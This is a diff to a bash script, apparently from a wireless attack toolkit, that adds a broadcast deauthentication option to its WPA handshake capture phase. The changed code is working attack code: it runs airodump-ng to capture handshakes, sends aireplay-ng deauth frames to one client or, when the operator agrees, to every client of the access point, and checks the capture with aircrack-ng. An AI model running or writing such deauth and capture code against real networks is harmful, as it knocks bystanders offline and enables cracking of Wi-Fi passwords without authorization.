@@ -75,10 +75,19 @@ if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
 
     # Phase 2: Handshake Capture
     echo "[HANDSHAKE] Starting airodump-ng on channel ${CHANNEL:-6} — timeout ${CAPTURE_TIME}s..."
+    BROADCAST_DEAUTH=0
     if [[ -n "$TARGET_CLIENT" ]]; then
         echo "[HANDSHAKE] Target client ${TARGET_CLIENT} — deauth every 15s to force reconnect."
     else
-        echo "[HANDSHAKE] No target client set — passive capture only. Run A4 first to select a client."
+        echo "[HANDSHAKE] No target client selected."
+        echo -n "[HANDSHAKE] Broadcast deauth all clients on ${BSSID} to force handshake? [y/N]: "
+        read -r _DEAUTH_CHOICE </dev/tty
+        if [[ "${_DEAUTH_CHOICE,,}" == "y" ]]; then
+            BROADCAST_DEAUTH=1
+            echo "[HANDSHAKE] Broadcast deauth enabled — sending every 15s. WARNING: disconnects all AP clients."
+        else
+            echo "[HANDSHAKE] Passive capture only — waiting for organic client reconnects."
+        fi
     fi
     timeout --foreground "$CAPTURE_TIME" airodump-ng --bssid "$BSSID" --channel "${CHANNEL:-6}" --write "${OUTPUT_BASE}_handshake" --output-format pcap "$INTERFACE" > /dev/null 2>&1 &
     AIRODUMP_PID=$!
@@ -87,9 +96,14 @@ if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
     ELAPSED=0
     SUCCESS=0
     while [[ "${ASTRA_INDEFINITE:-}" == "true" || $ELAPSED -lt $CAPTURE_TIME ]]; do
-        if [[ -n "$TARGET_CLIENT" ]] && (( ELAPSED > 0 )) && (( ELAPSED % 15 == 0 )); then
-            echo "[DEAUTH] Sending deauth to ${TARGET_CLIENT} (${ELAPSED}s)..."
-            aireplay-ng --deauth 5 -a "$BSSID" -c "$TARGET_CLIENT" "$INTERFACE" 2>/dev/null || true
+        if (( ELAPSED > 0 )) && (( ELAPSED % 15 == 0 )); then
+            if [[ -n "$TARGET_CLIENT" ]]; then
+                echo "[DEAUTH] Sending deauth to ${TARGET_CLIENT} (${ELAPSED}s)..."
+                aireplay-ng --deauth 5 -a "$BSSID" -c "$TARGET_CLIENT" "$INTERFACE" 2>/dev/null || true
+            elif [[ "$BROADCAST_DEAUTH" -eq 1 ]]; then
+                echo "[DEAUTH] Broadcast deauth on ${BSSID} (${ELAPSED}s)..."
+                aireplay-ng --deauth 5 -a "$BSSID" "$INTERFACE" 2>/dev/null || true
+            fi
         fi
         if [[ -f "$HANDSHAKE_FILE" ]]; then
             if aircrack-ng "$HANDSHAKE_FILE" 2>/dev/null | grep -q "1 handshake"; then
